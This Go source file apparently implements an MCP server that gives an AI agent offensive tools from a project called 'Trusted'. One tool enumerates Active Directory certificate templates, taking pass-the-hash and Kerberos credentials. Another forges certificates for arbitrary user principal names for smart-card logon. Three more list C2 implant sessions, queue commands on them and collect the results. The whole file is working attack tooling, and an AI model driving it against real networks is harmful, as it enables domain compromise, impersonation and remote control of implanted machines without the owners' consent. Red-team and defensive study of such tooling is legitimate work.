// Package mcp provides an MCP stdio server for Trusted.
// Tools: pki_enumerate, pki_forge, c2_list_sessions, c2_queue_command, c2_get_results.
package mcp

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/loudmumble/trusted/pkg/c2"
	"github.com/loudmumble/trusted/pkg/pki"
)

const (
	serverName    = "trusted"
	serverVersion = "1.0.0"
)

// Server is the MCP stdio server wrapping Trusted capabilities.
type Server struct {
	listener *c2.Listener
}

// NewServer creates an MCP server optionally backed by a running C2 listener.
func NewServer(listener *c2.Listener) *Server {
	return &Server{listener: listener}
}

// Serve runs the MCP protocol loop reading JSON-RPC from in, writing to out.
func (s *Server) Serve(in io.Reader, out io.Writer) error {
	scanner := bufio.NewScanner(in)
	scanner.Buffer(make([]byte, 0, 1024*1024), 1024*1024)

	for scanner.Scan() {
		line := scanner.Text()
		if line == "" {
			continue
		}

		var request map[string]interface{}
		if err := json.Unmarshal([]byte(line), &request); err != nil {
			writeError(out, nil, -32700, "Parse error")
			continue
		}

		method, _ := request["method"].(string)
		id := request["id"]

		switch method {
		case "initialize":
			writeResult(out, id, map[string]interface{}{
				"protocolVersion": "2024-11-05",
				"capabilities":    map[string]interface{}{"tools": map[string]interface{}{}},
				"serverInfo": map[string]interface{}{
					"name":    serverName,
					"version": serverVersion,
				},
			})
		case "notifications/initialized":
			// No response needed
		case "tools/list":
			writeResult(out, id, map[string]interface{}{
				"tools": toolList(),
			})
		case "tools/call":
			params, _ := request["params"].(map[string]interface{})
			name, _ := params["name"].(string)
			args, _ := params["arguments"].(map[string]interface{})
			result := s.callTool(name, args)
			writeResult(out, id, result)
		default:
			writeError(out, id, -32601, fmt.Sprintf("Method not found: %s", method))
		}
	}
	return scanner.Err()
}

// ServeStdio runs the MCP server on stdin/stdout.
func ServeStdio(listener *c2.Listener) error {
	s := NewServer(listener)
	return s.Serve(os.Stdin, os.Stdout)
}

func toolList() []map[string]interface{} {
	return []map[string]interface{}{
		{
			"name":        "pki_enumerate",
			"description": "Enumerate ADCS certificate templates on a target DC via LDAP.",
			"inputSchema": map[string]interface{}{
				"type": "object",
				"properties": map[string]interface{}{
					"target_dc": map[string]interface{}{"type": "string", "description": "Target domain controller hostname or IP."},
					"domain":    map[string]interface{}{"type": "string", "description": "Active Directory domain name."},
					"username":  map[string]interface{}{"type": "string", "description": "Domain username for LDAP bind."},
					"password":  map[string]interface{}{"type": "string", "description": "Domain password."},
					"hash":      map[string]interface{}{"type": "string", "description": "NTLM hash for pass-the-hash."},
					"kerberos":  map[string]interface{}{"type": "boolean", "description": "Use Kerberos authentication (GSSAPI/SPNEGO)."},
					"ccache":    map[string]interface{}{"type": "string", "description": "Path to Kerberos ccache file."},
					"keytab":    map[string]interface{}{"type": "string", "description": "Path to Kerberos keytab file."},
					"dc_ip":     map[string]interface{}{"type": "string", "description": "KDC IP address (if different from target_dc)."},
				},
				"required": []string{"target_dc", "domain"},
			},
		},
		{
			"name":        "pki_forge",
			"description": "Forge a golden certificate with a given UPN for smart card authentication.",
			"inputSchema": map[string]interface{}{
				"type": "object",
				"properties": map[string]interface{}{
					"upn":    map[string]interface{}{"type": "string", "description": "User Principal Name (e.g. admin@corp.local)."},
					"output": map[string]interface{}{"type": "string", "description": "Output file path for the PEM certificate."},
				},
				"required": []string{"upn"},
			},
		},
		{
			"name":        "c2_list_sessions",
			"description": "List all active C2 implant sessions.",
			"inputSchema": map[string]interface{}{"type": "object", "properties": map[string]interface{}{}},
		},
		{
			"name":        "c2_queue_command",
			"description": "Queue a command for execution on a C2 implant session.",
			"inputSchema": map[string]interface{}{
				"type": "object",
				"properties": map[string]interface{}{
					"session_id": map[string]interface{}{"type": "string", "description": "Target session ID."},
					"command":    map[string]interface{}{"type": "string", "description": "Command to execute."},
					"args":       map[string]interface{}{"type": "string", "description": "Optional arguments."},
				},
				"required": []string{"session_id", "command"},
			},
		},
		{
			"name":        "c2_get_results",
			"description": "Get command results from C2 sessions.",
			"inputSchema": map[string]interface{}{
				"type": "object",
				"properties": map[string]interface{}{
					"session_id": map[string]interface{}{"type": "string", "description": "Filter by session ID."},
				},
			},
		},
	}
}

func (s *Server) callTool(name string, args map[string]interface{}) map[string]interface{} {
	switch name {
	case "pki_enumerate":
		return s.runPKIEnumerate(args)
	case "pki_forge":
		return s.runPKIForge(args)
	case "c2_list_sessions":
		return s.runC2ListSessions(args)
	case "c2_queue_command":
		return s.runC2QueueCommand(args)
	case "c2_get_results":
		return s.runC2GetResults(args)
	default:
		return toolError(fmt.Sprintf("Unknown tool: %s", name))
	}
}

func (s *Server) runPKIEnumerate(args map[string]interface{}) map[string]interface{} {
	targetDC, _ := args["target_dc"].(string)
	domain, _ := args["domain"].(string)
	username, _ := args["username"].(string)
	password, _ := args["password"].(string)
	hash, _ := args["hash"].(string)
	kerberos, _ := args["kerberos"].(bool)
	ccache, _ := args["ccache"].(string)
	keytab, _ := args["keytab"].(string)
	dcIP, _ := args["dc_ip"].(string)

	if targetDC == "" || domain == "" {
		return toolError("target_dc and domain are required")
	}

	cfg := &pki.ADCSConfig{
		TargetDC: targetDC, Domain: domain,
		Username: username, Password: password, Hash: hash,
		Kerberos: kerberos, CCache: ccache, Keytab: keytab, KDCIP: dcIP,
	}

	conn, err := pki.ConnectLDAP(context.Background(), cfg)
	if err != nil {
		return toolError(fmt.Sprintf("ldap connect: %v", err))
	}
	defer conn.Close()
	templates, err := pki.EnumerateTemplates(context.Background(), cfg, conn)
	if err != nil {
		return toolError(fmt.Sprintf("Enumeration failed: %v", err))
	}

	return toolResult(map[string]interface{}{
		"status": "completed", "domain": domain, "target_dc": targetDC,
		"templates": templates, "count": len(templates),
	})
}

func (s *Server) runPKIForge(args map[string]interface{}) map[string]interface{} {
	upn, _ := args["upn"].(string)
	output, _ := args["output"].(string)
	if upn == "" {
		return toolError("upn is required")
	}
	if output == "" {
		// Default to UPN username (e.g., administrator@corp.local → administrator.pem)
		if idx := strings.Index(upn, "@"); idx > 0 {
			output = upn[:idx] + ".pem"
		} else {
			output = upn + ".pem"
		}
	}

	caKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return toolError(fmt.Sprintf("Generate CA key: %v", err))
	}

	cert, certKey, err := pki.ForgeCertificate(caKey, upn)
	if err != nil {
		return toolError(fmt.Sprintf("Forge failed: %v", err))
	}

	basePath := strings.TrimSuffix(output, ".pem")
	basePath = strings.TrimSuffix(basePath, ".crt")
	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return toolError(fmt.Sprintf("Write cert: %v", err))
	}

	return toolResult(map[string]interface{}{
		"status": "completed", "upn": upn, "output": basePath + ".crt",
		"key_output": basePath + ".key",
		"subject":    cert.Subject.CommonName, "serial": cert.SerialNumber.String(),
	})
}

func (s *Server) runC2ListSessions(_ map[string]interface{}) map[string]interface{} {
	resp, err := http.Get("http://127.0.0.1:24242/api/sessions")
	if err != nil {
		return toolError("No C2 listener running locally on port 24242. Start with 'trusted c2' first.")
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return toolError(fmt.Sprintf("Failed to list sessions (HTTP %d)", resp.StatusCode))
	}

	var sessions []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&sessions); err != nil {
		return toolError(fmt.Sprintf("Failed to decode response: %v", err))
	}

	return toolResult(map[string]interface{}{"status": "completed", "sessions": sessions, "count": len(sessions)})
}

func (s *Server) runC2QueueCommand(args map[string]interface{}) map[string]interface{} {
	sessionID, _ := args["session_id"].(string)
	command, _ := args["command"].(string)
	cmdArgs, _ := args["args"].(string)
	if sessionID == "" || command == "" {
		return toolError("session_id and command are required")
	}

	payload := map[string]interface{}{
		"session_id": sessionID,
		"command":    command,
		"args":       cmdArgs,
	}
	data, _ := json.Marshal(payload)

	resp, err := http.Post("http://127.0.0.1:24242/api/command", "application/json", bytes.NewReader(data))
	if err != nil {
		return toolError("No C2 listener running locally on port 24242. Start with 'trusted c2' first.")
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		var errResp map[string]string
		json.NewDecoder(resp.Body).Decode(&errResp)
		return toolError(fmt.Sprintf("Failed to queue command (HTTP %d): %s", resp.StatusCode, errResp["error"]))
	}

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	return toolResult(result)
}

func (s *Server) runC2GetResults(args map[string]interface{}) map[string]interface{} {
	sessionID, _ := args["session_id"].(string)
	url := "http://127.0.0.1:24242/api/results"
	if sessionID != "" {
		url += "?session_id=" + sessionID
	}

	resp, err := http.Get(url)
	if err != nil {
		return toolError("No C2 listener running locally on port 24242. Start with 'trusted c2' first.")
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return toolError(fmt.Sprintf("Failed to get results (HTTP %d)", resp.StatusCode))
	}

	var results []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&results); err != nil {
		return toolError(fmt.Sprintf("Failed to decode response: %v", err))
	}

	return toolResult(map[string]interface{}{"status": "completed", "results": results, "count": len(results)})
}

func toolResult(data map[string]interface{}) map[string]interface{} {
	content, _ := json.Marshal(data)
	return map[string]interface{}{
		"content": []map[string]interface{}{{"type": "text", "text": string(content)}},
	}
}

func toolError(msg string) map[string]interface{} {
	return map[string]interface{}{
		"content": []map[string]interface{}{{"type": "text", "text": fmt.Sprintf(`{"error": "%s"}`, msg)}},
		"isError": true,
	}
}

func writeResult(w io.Writer, id interface{}, result interface{}) {
	resp := map[string]interface{}{"jsonrpc": "2.0", "id": id, "result": result}
	data, _ := json.Marshal(resp)
	fmt.Fprintf(w, "%s\n", data)
}

func writeError(w io.Writer, id interface{}, code int, message string) {
	resp := map[string]interface{}{
		"jsonrpc": "2.0", "id": id,
		"error": map[string]interface{}{"code": code, "message": message},
	}
	data, _ := json.Marshal(resp)
	fmt.Fprintf(w, "%s\n", data)
}
